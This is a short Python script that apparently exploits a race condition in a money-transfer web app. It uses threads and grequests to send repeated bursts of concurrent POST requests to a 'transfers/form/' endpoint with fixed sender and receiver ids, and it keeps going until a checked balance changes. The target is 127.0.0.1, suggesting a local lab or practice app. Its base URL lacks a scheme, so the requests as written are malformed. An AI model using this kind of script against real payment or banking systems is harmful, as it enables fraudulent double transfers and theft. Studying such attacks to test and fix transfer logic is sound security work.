import threading
# import requests
import json
import grequests


class RaceCondition:
    no_threads: int
    post_url: str
    params = {'sender_id': 1, 'receiver_id': 2}
    data = {'number': 1}
    base_url: str
    threads: [threading.Thread]
    amount: int

    def __init__(self, no_threads: int, base_url: str, post_url: str):
        self.no_threads = no_threads
        self.post_url = post_url
        self.base_url = base_url

    def run(self):

        # run the code
        self.amount = self.get_amount()
        count = 0
        while self.get_amount() == self.amount:
            count += 1
            print("Number of runs:", count)
            # run threads
            self.create_threads()
            self.run_threads()
            self.close_thread()
        # self.one_thread()

    def create_threads(self):
        self.threads = []
        for i in range(self.no_threads):
            self.threads.append(threading.Thread(target=run_script, args=(self.base_url + self.post_url, self.params,
                                                                          self.data)))

    def run_threads(self):
        for i in range(len(self.threads)):
            self.threads[i].start()
        # var = (thread.start() for thread in self.threads)

    def close_thread(self):
        for i in range(len(self.threads)):
            self.threads[i].join()
        self.threads = []
        # var = (thread.join() for thread in self.threads)

    def one_thread(self):
        run_script(self.base_url + self.post_url, self.params, self.data)

    def get_amount(self):
        x = grequests.get(self.base_url + "transfers/check_amount").send()
        amount = json.loads(x.response.text)['amount']
        return amount


def run_script(url: str, params: dict, data: dict):
    x = grequests.post(url, params=params, data=data).send()


if __name__ == '__main__':
    var = RaceCondition(5, "127.0.0.1", "transfers/form/")
    var.run()
